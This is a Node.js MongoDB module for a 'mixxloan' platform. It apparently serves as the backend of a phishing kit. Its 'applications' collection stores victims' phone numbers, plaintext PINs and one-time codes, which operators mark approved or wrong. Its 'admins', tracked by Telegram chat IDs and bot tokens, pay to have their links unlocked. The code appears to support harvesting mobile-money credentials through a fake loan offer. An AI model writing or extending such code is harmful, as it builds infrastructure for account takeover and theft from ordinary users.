const { MongoClient } = require('mongodb');

let client;
let db;
let connectionAttempts = 0;
const MAX_RETRY_ATTEMPTS = 5;
const INITIAL_RETRY_DELAY = 2000; // 2 seconds

// Database and collections
const DB_NAME = 'mixxloan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

/**
 * Connect to MongoDB with retry logic
 */
async function connectDatabase() {
    const MONGODB_URI = process.env.MONGODB_URI;

    if (!MONGODB_URI) {
        console.error('❌ MONGODB_URI is not set in environment variables');
        throw new Error('MONGODB_URI environment variable is required');
    }

    console.log('🔄 Connecting to MongoDB...');
    console.log(`📍 Cluster: ${MONGODB_URI.match(/@([^/]+)/)?.[1] || 'unknown'}`);

    return new Promise((resolve, reject) => {
        attemptConnection(MONGODB_URI, 0, resolve, reject);
    });
}

/**
 * Attempt connection with exponential backoff retry
 */
async function attemptConnection(uri, attempt, resolve, reject) {
    try {
        connectionAttempts = attempt + 1;
        
        console.log(`\n📡 Connection attempt ${connectionAttempts}/${MAX_RETRY_ATTEMPTS}`);

        // Create client with optimized timeout settings
        client = new MongoClient(uri, {
            // Connection timeouts
            serverSelectionTimeoutMS: 10000,  // 10 seconds to select a server
            connectTimeoutMS: 10000,          // 10 seconds to connect
            socketTimeoutMS: 45000,           // 45 seconds for socket operations
            
            // Retry and heartbeat settings
            retryWrites: true,
            retryReads: true,
            heartbeatFrequencyMS: 10000,
            
            // Connection pool
            maxPoolSize: 10,
            minPoolSize: 2,
            
            // Other options
            w: 'majority',
            journal: true
        });

        // Add event listeners for debugging
        client.on('error', (error) => {
            console.error('❌ Client error event:', error.message);
        });

        client.on('serverDescriptionChanged', (event) => {
            console.log(`🔍 Server status changed: ${event.newDescription.type}`);
        });

        // Attempt to connect
        await client.connect();
        console.log('✅ Connected to MongoDB successfully');

        // Verify connection by pinging the database
        const adminDb = client.db('admin');
        await adminDb.command({ ping: 1 });
        console.log('✅ Ping successful - database is responsive');

        // Set global db reference
        db = client.db(DB_NAME);

        // Create indexes
        await createIndexes();
        
        console.log('✅ Database initialization complete\n');
        resolve(db);

    } catch (error) {
        console.error(`❌ Connection attempt ${connectionAttempts} failed:`, error.message);

        // If we still have retries, try again with exponential backoff
        if (connectionAttempts < MAX_RETRY_ATTEMPTS) {
            const delayMs = INITIAL_RETRY_DELAY * Math.pow(2, connectionAttempts - 1);
            console.log(`⏳ Retrying in ${delayMs / 1000} seconds... (${MAX_RETRY_ATTEMPTS - connectionAttempts} attempts remaining)\n`);

            // Close the failed client
            try {
                await client.close();
            } catch (e) {
                // Ignore close errors
            }

            // Schedule retry
            setTimeout(() => {
                attemptConnection(uri, connectionAttempts, resolve, reject);
            }, delayMs);
        } else {
            // Max retries exceeded
            const errorMsg = `Failed to connect to MongoDB after ${MAX_RETRY_ATTEMPTS} attempts. Error: ${error.message}`;
            console.error(`\n❌ ${errorMsg}\n`);
            reject(new Error(errorMsg));
        }
    }
}

/**
 * Check if database is connected
 */
function isDatabaseReady() {
    return db !== undefined && client !== null;
}

/**
 * Get database instance (for immediate use without waiting)
 */
function getDatabase() {
    if (!isDatabaseReady()) {
        throw new Error('Database not connected yet. Call connectDatabase() first.');
    }
    return db;
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        console.log('📑 Creating database indexes...');
        
        // Admin indexes
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ paymentStatus: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ linkLocked: 1 });

        // Application indexes
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
        // Don't throw - indexes are not critical for startup
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        try {
            await client.close();
            client = null;
            db = null;
            console.log('✅ Database connection closed');
        } catch (error) {
            console.error('⚠️ Error closing database:', error.message);
        }
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId)        throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name:      adminData.name,
            email:     adminData.email,
            chatId:    adminData.chatId,
            status:    adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString(),
            
            // ✅ Link Payment Fields
            linkLocked: adminData.linkLocked !== undefined ? adminData.linkLocked : false,
            linkCreatedAt: adminData.linkCreatedAt || new Date().toISOString(),
            linkLockedAt: adminData.linkLockedAt || null,
            
            // ✅ Payment Status Fields
            paymentStatus: adminData.paymentStatus || 'pending', // 'pending' | 'approved' | 'rejected'
            paymentSubmittedAt: adminData.paymentSubmittedAt || null,
            payerName: adminData.payerName || null,
            paidAt: adminData.paidAt || null
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name:    adminDocument.name,
            email:   adminDocument.email,
            chatId:  adminDocument.chatId,
            status:  adminDocument.status,
            linkLocked: adminDocument.linkLocked,
            paymentStatus: adminDocument.paymentStatus
        });

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting all admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin updated: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin status updated: ${adminId} → ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// ADMIN LINK PAYMENT OPERATIONS
// ==========================================

/**
 * Get all admins with pending payment submissions
 */
async function getPendingPaymentApprovals() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ 
                paymentStatus: 'pending',
                payerName: { $exists: true, $ne: null }
            })
            .sort({ paymentSubmittedAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending payment approvals:', error);
        return [];
    }
}

/**
 * Get admin payment status
 */
async function getAdminPaymentStatus(adminId) {
    try {
        const admin = await getAdmin(adminId);
        if (!admin) return null;
        
        return {
            adminId: admin.adminId,
            name: admin.name,
            paymentStatus: admin.paymentStatus,
            payerName: admin.payerName,
            paymentSubmittedAt: admin.paymentSubmittedAt,
            paidAt: admin.paidAt,
            linkLocked: admin.linkLocked,
            linkCreatedAt: admin.linkCreatedAt,
            linkLockedAt: admin.linkLockedAt
        };
    } catch (error) {
        console.error('❌ Error getting payment status:', error);
        return null;
    }
}

/**
 * Check if admin link is locked
 */
async function isAdminLinkLocked(adminId) {
    try {
        const admin = await getAdmin(adminId);
        return admin ? admin.linkLocked === true : false;
    } catch (error) {
        console.error('❌ Error checking link lock status:', error);
        return false;
    }
}

/**
 * Lock admin link
 */
async function lockAdminLink(adminId) {
    try {
        const result = await updateAdmin(adminId, {
            linkLocked: true,
            linkLockedAt: new Date().toISOString()
        });
        console.log(`🔒 Admin link locked: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error locking admin link:', error);
        throw error;
    }
}

/**
 * Unlock admin link (approve payment)
 */
async function unlockAdminLink(adminId) {
    try {
        const result = await updateAdmin(adminId, {
            linkLocked: false,
            paymentStatus: 'approved',
            paidAt: new Date().toISOString()
        });
        console.log(`🔓 Admin link unlocked: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error unlocking admin link:', error);
        throw error;
    }
}

/**
 * Submit payment for admin (called when admin enters payer name)
 */
async function submitAdminPayment(adminId, payerName) {
    try {
        const result = await updateAdmin(adminId, {
            paymentStatus: 'pending',
            payerName,
            paymentSubmittedAt: new Date().toISOString()
        });
        console.log(`💰 Payment submitted for admin ${adminId}: ${payerName}`);
        return result;
    } catch (error) {
        console.error('❌ Error submitting payment:', error);
        throw error;
    }
}

/**
 * Reject payment submission
 */
async function rejectAdminPayment(adminId) {
    try {
        const result = await updateAdmin(adminId, {
            paymentStatus: 'rejected',
            paymentSubmittedAt: null,
            payerName: null
        });
        console.log(`❌ Payment rejected for admin ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error rejecting payment:', error);
        throw error;
    }
}

/**
 * Approve payment and unlock link
 */
async function approveAdminPayment(adminId) {
    try {
        const result = await updateAdmin(adminId, {
            paymentStatus: 'approved',
            linkLocked: false,
            paidAt: new Date().toISOString()
        });
        console.log(`✅ Payment approved for admin ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error approving payment:', error);
        throw error;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:             appData.id,
            adminId:        appData.adminId,
            adminName:      appData.adminName,
            phoneNumber:    appData.phoneNumber,
            pin:            appData.pin,
            pinStatus:      appData.pinStatus  || 'pending',
            otpStatus:      appData.otpStatus  || 'pending',
            otp:            appData.otp        || null,
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount:  appData.previousCount   || 0,
            timestamp:      appData.timestamp || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            const paymentStatus = admin.paymentStatus || 'pending';
            const linkStatus = admin.linkLocked ? '🔒 Locked' : '🔓 Unlocked';
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status}, payment: ${paymentStatus}, link: ${linkStatus})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,
    isDatabaseReady,
    getDatabase,

    // Admin operations
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    // Admin link payment operations
    getPendingPaymentApprovals,
    getAdminPaymentStatus,
    isAdminLinkLocked,
    lockAdminLink,
    unlockAdminLink,
    submitAdminPayment,
    rejectAdminPayment,
    approveAdminPayment,

    // Application operations
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    // Statistics operations
    getAdminStats,
    getStats,
    getPerAdminStats,

    // Debug & maintenance
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
